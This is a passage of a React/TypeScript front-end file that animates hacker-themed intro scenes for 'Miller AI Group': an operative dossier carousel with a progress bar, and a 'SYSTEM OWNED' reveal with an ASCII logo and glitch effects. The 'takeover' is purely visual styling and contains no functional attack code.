          exit={{ opacity: 0, x: -100 }}
          transition={{ duration: 0.3 }}
        >
          <CharacterDossierCard
            character={operative}
            isActive={true}
            onComplete={handleOperativeComplete}
          />
        </motion.div>
      </AnimatePresence>

      {/* Progress indicator */}
      <div className="absolute bottom-8 left-1/2 -translate-x-1/2 flex gap-3">
        {OPERATIVES.map((_, i) => (
          <motion.div
            key={i}
            className="w-16 h-1 rounded-full"
            style={{
              background: i <= currentOperative ? operative.primaryColor : 'rgba(255,255,255,0.2)'
            }}
            animate={i === currentOperative ? { opacity: [0.5, 1, 0.5] } : {}}
            transition={{ duration: 1, repeat: Infinity }}
          />
        ))}
      </div>

      {/* Corner brackets */}
      <HUDBrackets color={operative.primaryColor} size={50} />

      {/* Bottom info bar */}
      <div className="absolute bottom-4 left-8 right-8 flex justify-between font-mono text-xs">
        <span style={{ color: operative.primaryColor }}>
          MILLER AI GROUP // OPERATIVE DOSSIER {currentOperative + 1}/{OPERATIVES.length}
        </span>
        <span className="text-neutral-500">CLEARANCE: OMEGA BLACK</span>
      </div>

      <ScanLineOverlay speed={5} color={operative.primaryColor} />
    </motion.div>
  )
}

// ============================================
// SCENE 6: SYSTEM TAKEOVER COMPLETE
// Final dramatic reveal
// ============================================

export function TakeoverCompleteScene({ onComplete }: SceneProps) {
  const [stage, setStage] = useState(0)

  useEffect(() => {
    const timers = [
      setTimeout(() => setStage(1), 500),
      setTimeout(() => setStage(2), 1500),
      setTimeout(() => setStage(3), 2500),
      setTimeout(() => setStage(4), 3500),
      setTimeout(onComplete, 6000)
    ]
    return () => timers.forEach(clearTimeout)
  }, [onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black flex items-center justify-center"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <DataStreamRain color="#ff00ff" density={1.5} speed={1.5} className="opacity-40" />

      <GlitchCanvas intensity={1.5} layers={['rgb-split', 'noise', 'scanlines', 'vhs']}>
        <ScreenShake active={stage >= 1 && stage < 3} intensity={0.8}>
          <motion.div className="relative z-10 text-center px-8">
            {/* ASCII Logo */}
            <AnimatePresence>
              {stage >= 1 && (
                <motion.pre
                  className="text-fuchsia-500 text-xs md:text-sm font-mono mb-8 leading-tight whitespace-pre"
                  style={{ textShadow: '0 0 30px rgba(255,0,255,0.8)' }}
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: 1, scale: 1 }}
                  transition={{ duration: 0.5 }}
                >
{`
 ███╗   ███╗██╗██╗     ██╗     ███████╗██████╗      █████╗ ██╗
 ████╗ ████║██║██║     ██║     ██╔════╝██╔══██╗    ██╔══██╗██║
 ██╔████╔██║██║██║     ██║     █████╗  ██████╔╝    ███████║██║
 ██║╚██╔╝██║██║██║     ██║     ██╔══╝  ██╔══██╗    ██╔══██║██║
 ██║ ╚═╝ ██║██║███████╗███████╗███████╗██║  ██║    ██║  ██║██║
 ╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝
           ██████╗ ██████╗  ██████╗ ██╗   ██╗██████╗
          ██╔════╝ ██╔══██╗██╔═══██╗██║   ██║██╔══██╗
          ██║  ███╗██████╔╝██║   ██║██║   ██║██████╔╝
          ██║   ██║██╔══██╗██║   ██║██║   ██║██╔═══╝
          ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║
           ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝
`}
                </motion.pre>
              )}
            </AnimatePresence>

            {/* SYSTEM OWNED */}
            <AnimatePresence>
              {stage >= 2 && (
                <motion.h1
                  className="text-5xl md:text-8xl font-bold font-mono mb-6"
                  style={{
                    color: '#ff0040',
                    textShadow: '0 0 60px rgba(255,0,64,0.8), 6px 0 0 #00ffff, -6px 0 0 #ff00ff'
                  }}
                  initial={{ opacity: 0, scale: 0.5, y: 50 }}
                  animate={{ opacity: 1, scale: 1, y: 0 }}
                  transition={{ type: 'spring', duration: 0.6 }}
                >
                  <ChromaticText intensity={2}>SYSTEM OWNED</ChromaticText>
                </motion.h1>
              )}
            </AnimatePresence>

            {/* Welcome message */}
            <AnimatePresence>
              {stage >= 3 && (
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.5 }}
                >
                  <p className="text-2xl md:text-3xl font-mono text-fuchsia-400 mb-3">
                    Welcome to the collective
                  </p>
                  <p className="text-sm md:text-base font-mono text-neutral-500">
                    Your system now belongs to Miller AI Group
                  </p>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Operative count */}
            <AnimatePresence>
              {stage >= 4 && (
                <motion.div
                  className="mt-8 flex justify-center gap-4"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                >
                  {OPERATIVES.map((op, i) => (
                    <motion.div
                      key={op.id}
                      className="w-3 h-3 rounded-full"
                      style={{ background: op.primaryColor, boxShadow: `0 0 10px ${op.primaryColor}` }}
                      initial={{ scale: 0 }}
                      animate={{ scale: 1 }}
                      transition={{ delay: i * 0.1 }}
                    />
                  ))}
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        </ScreenShake>
      </GlitchCanvas>

      <HUDBrackets color="#ff00ff" />
      <ScanLineOverlay speed={2} color="#ff00ff" />
    </motion.div>
  )
}
